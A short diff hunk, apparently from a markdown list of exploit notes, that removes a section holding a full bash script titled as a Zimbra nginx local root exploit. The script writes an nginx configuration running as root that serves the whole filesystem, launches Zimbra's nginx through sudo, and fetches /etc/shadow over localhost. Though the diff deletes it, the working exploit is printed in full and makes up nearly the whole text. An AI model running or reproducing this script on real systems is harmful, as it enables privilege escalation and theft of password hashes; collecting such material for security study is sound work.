@@ -18,28 +18,3 @@ sudo apt update > /dev/null 2>&1
 
 ````
 
-## zimbra-nginx-local-root-exploit
-- [Source](https://darrenmartyn.ie/2021/10/25/zimbra-nginx-local-root-exploit/)
-````
-#!/bin/bash
-echo "[+] making config"
-cat <<EOF >/tmp/nginx.conf
-user root;
-worker_processes 4;
-pid /tmp/nginx.pid;
-events {
-        worker_connections 768;
-}
-http {
-server {
-    listen 1337;
-    root /;
-    autoindex on;
-}
-}
-EOF
-echo "[+] Launching..."
-sudo /opt/zimbra/common/sbin/nginx -c /tmp/nginx.conf
-echo "[+] Reading /etc/shadow..."
-curl http://localhost:1337/etc/shadow
-````
